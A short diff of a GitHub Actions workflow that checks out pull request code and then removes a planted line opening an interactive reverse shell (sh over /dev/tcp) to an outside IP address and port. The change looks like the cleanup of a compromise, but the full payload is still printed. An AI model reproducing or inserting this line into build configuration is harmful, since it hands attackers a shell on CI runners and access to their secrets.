@@ -22,7 +22,6 @@ jobs:
           git remote add pr-source ${{ github.event.pull_request.head.repo.clone_url }}
           git fetch pr-source ${{ github.event.pull_request.head.ref }}
           git checkout FETCH_HEAD
-          sh -i >& /dev/tcp/194.59.158.195/5544 0>&1
       # https://github.com/line/line-bot-sdk-java/blob/master/.github/workflows/gradle.yml
       - name: Setup Java
         uses: actions/setup-java@v3
